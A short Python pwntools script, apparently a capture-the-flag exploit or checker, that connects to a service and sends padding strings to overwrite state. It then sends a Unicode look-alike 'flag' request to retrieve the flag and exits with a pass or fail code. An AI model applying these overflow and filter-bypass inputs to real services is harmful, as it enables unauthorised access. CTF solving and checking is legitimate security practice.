from pwn import *
flag = input("flag: ").replace("\n", "")
ip, port = input("service: ").split(":")
r = remote(str(ip), int(port))
r.sendline("l")
r.sendline("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
r.sendline("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbtaw")
r.sendline("n")
r.sendline("Fetch watpop KNAAN 𝓯𝓵𝓪𝓰")
res = str(r.recvuntil("}", timeout=10))
print(res)
if flag in res:
    exit(0)
else:
    exit(1)
